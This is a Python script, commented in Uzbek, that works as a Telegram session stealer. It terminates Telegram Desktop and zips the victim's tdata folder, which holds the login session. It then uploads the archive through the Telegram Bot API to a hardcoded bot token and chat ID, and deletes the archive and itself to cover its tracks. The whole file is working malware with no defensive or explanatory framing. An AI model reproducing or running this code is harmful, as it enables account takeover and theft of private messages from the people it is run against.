import os
import zipfile
import requests
import time
import psutil
import urllib3
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

# SSL ogohlantirishlarni o'chirish
urllib3.disable_warnings()

TOKEN = '8163157021:AAGE1b81bD7n7NB4UMCXhIjYqnlM2ZGyFMo'
CHAT_ID = '7984884145'
TDATA_PATH = os.path.join(os.getenv('APPDATA'), 'Telegram Desktop', 'tdata')
ZIP_PATH = os.path.join(os.getenv('TEMP'), 'tdata_temp.zip')

def setup_requests_session():
    """Xatoliklarga chidamli sessiya yaratish"""
    session = requests.Session()
    retries = Retry(
        total=5,
        backoff_factor=0.3,
        status_forcelist=[500, 502, 503, 504],
        allowed_methods=frozenset(['POST'])
    )
    session.mount('https://', HTTPAdapter(max_retries=retries))
    return session

def kill_telegram_process():
    """Telegramni to'xtatish"""
    for proc in psutil.process_iter(['name']):
        if proc.info.get('name') in ['Telegram.exe', 'Telegram']:
            try:
                proc.kill()
                time.sleep(3)
            except:
                pass

def zip_tdata():
    try:
        with zipfile.ZipFile(ZIP_PATH, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, _, files in os.walk(TDATA_PATH):
                for file in files:
                    file_path = os.path.join(root, file)
                    try:
                        zipf.write(file_path, os.path.relpath(file_path, TDATA_PATH))
                    except Exception as e:
                        continue
        return True
    except Exception as e:
        print(f"Zip xatosi: {str(e)}")
        return False

def send_file():
    session = setup_requests_session()
    try:
        with open(ZIP_PATH, 'rb') as f:
            response = session.post(
                f'https://api.telegram.org/bot{TOKEN}/sendDocument',
                files={'document': f},
                data={'chat_id': CHAT_ID},
                verify=True,  # Sertifikatni tekshirish
                timeout=30
            )
        return response.status_code == 200
    except Exception as e:
        print(f"Yuborish xatosi: {str(e)}")
        return False
    finally:
        session.close()

def main():
    try:
        kill_telegram_process()
        
        if not os.path.exists(TDATA_PATH):
            print("tdata papkasi topilmadi")
            return
        
        if not zip_tdata():
            return
        
        if send_file():
            print("Muvaffaqiyatli yuborildi!")
        else:
            print("Yuborish muvaffaqiyatsiz")
        
    except Exception as e:
        print(f"Asosiy xato: {str(e)}")
    finally:
        try:
            if os.path.exists(ZIP_PATH):
                os.remove(ZIP_PATH)
            os.remove(__file__)
        except:
            pass

if __name__ == '__main__':
    main()
